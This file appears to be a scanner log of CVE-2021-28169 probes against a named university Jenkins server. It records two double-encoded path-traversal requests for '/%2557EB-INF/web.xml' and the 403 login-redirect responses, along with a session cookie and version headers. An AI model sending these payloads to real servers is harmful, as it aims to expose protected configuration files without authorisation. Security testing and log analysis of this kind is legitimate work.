@@ -1,0 +1,67 @@
+[CVE-2021-28169] Dumped HTTP request for https://pipeline.eresearch.unimelb.edu.au/static?/%2557EB-INF/web.xml
+
+
+GET /static?/%2557EB-INF/web.xml HTTP/1.1
+Host: pipeline.eresearch.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2021-28169] Dumped HTTP response https://pipeline.eresearch.unimelb.edu.au/static?/%2557EB-INF/web.xml
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:12 GMT
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Server: Jetty(12.0.22)
+Set-Cookie: JSESSIONID.f9da2665=node0ys19h70s2g4d1r0kikivmgizn2930.node0; Path=/; Secure; HttpOnly; SameSite=Lax
+Strict-Transport-Security: max-age=63072000
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Hudson: 1.395
+X-Jenkins: 2.516.1
+X-Jenkins-Session: 529aec02
+
+<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2Fstatic%3F%2F%252557EB-INF%2Fweb.xml'/><script id='redirect' data-redirect-url='/login?from=%2Fstatic%3F%2F%252557EB-INF%2Fweb.xml' src='/static/529aec02/scripts/redirect.js'></script></head><body style='background-color:white; color:white;'>
+Authentication required
+<!--
+-->
+
+</body></html>                                                                                                                                                                                                                                                                                                            
+[CVE-2021-28169] Dumped HTTP request for https://pipeline.eresearch.unimelb.edu.au/concat?/%2557EB-INF/web.xml
+
+
+GET /concat?/%2557EB-INF/web.xml HTTP/1.1
+Host: pipeline.eresearch.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Cookie: JSESSIONID.f9da2665=node0ys19h70s2g4d1r0kikivmgizn2930.node0
+Accept-Encoding: gzip
+
+
+[CVE-2021-28169] Dumped HTTP response https://pipeline.eresearch.unimelb.edu.au/concat?/%2557EB-INF/web.xml
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:13 GMT
+Server: Jetty(12.0.22)
+Strict-Transport-Security: max-age=63072000
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Hudson: 1.395
+X-Jenkins: 2.516.1
+X-Jenkins-Session: 529aec02
+
+<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2Fconcat%3F%2F%252557EB-INF%2Fweb.xml'/><script id='redirect' data-redirect-url='/login?from=%2Fconcat%3F%2F%252557EB-INF%2Fweb.xml' src='/static/529aec02/scripts/redirect.js'></script></head><body style='background-color:white; color:white;'>
+Authentication required
+<!--
+-->
+
+</body></html>                                                                                                                                                                                                                                                                                                            
